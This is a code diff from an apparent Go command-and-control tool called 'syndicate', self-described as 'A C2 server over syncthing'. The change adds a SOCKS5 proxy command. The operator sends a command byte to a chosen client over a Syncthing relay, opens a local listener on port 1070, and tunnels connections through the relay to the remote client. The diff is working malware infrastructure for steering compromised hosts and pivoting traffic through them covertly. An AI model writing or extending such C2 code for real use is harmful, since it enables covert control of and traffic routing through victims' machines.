@@ -7,6 +7,9 @@ import (
 	"encoding/gob"
 	"errors"
 	"fmt"
+	"log"
+	"net"
+	"net/url"
 	"os"
 	"os/signal"
 
@@ -19,7 +22,7 @@ import (
 func main() {
 	// clientIndex is always +1 of the actual index as 0 means broadcast
 	var clientIndex int
-	var countryCode string = "UK"
+	var countryCode string
 	var commandText string
 
 	cli := clir.NewCli("syndicate", "A C2 server over syncthing", "v0.0.1")
@@ -52,6 +55,9 @@ func main() {
 			fmt.Println("The command entered was invalid")
 			return err
 		}
+		if countryCode == "" {
+			countryCode = "GB"
+		}
 
 		client := clientList[clientIndex-1]
 		// Find optimal relay
@@ -76,13 +82,43 @@ func main() {
 			panic(err)
 		}
 		defer conn.Close()
-		conn.Write([]byte{byte(commandStruct.Command)})
+		defer conn.Write([]byte{commands.Exit})
+		log.Println("Writing command", commandStruct)
+		_, err = conn.Write([]byte{byte(commandStruct.Command)})
+		if err != nil {
+			panic(err)
+		}
+		// Try reading a byte to ensure the connection hasn't died
+		// _, err = conn.Read(make([]byte, 1))
+		// if err != nil {
+		// 	log.Println("Connection died. This happens randomly sometimes. Try again")
+		// 	return err
+		// }
+		switch commandStruct.Command {
+		case commands.Socks5:
+			{
+				listen, err := net.Listen("tcp", "127.0.0.1:1070")
+				if err != nil {
+					return err
+				}
+				go func() {
+					for {
+						socksConn, err := listen.Accept()
+						if err != nil {
+							return
+						}
+						log.Println("Got connection", socksConn.RemoteAddr())
+						relayURL, _ := url.Parse(relayAddress)
+						go handleSocks(relayURL, socksConn, client.ClientID, cert)
+					}
+				}()
+			}
+		}
+
 		// Wait for exit signal
 		c := make(chan os.Signal, 1)
 		signal.Notify(c, os.Interrupt)
 		<-c
-
-		conn.Write([]byte{commands.Exit})
 
 		return nil
 	})
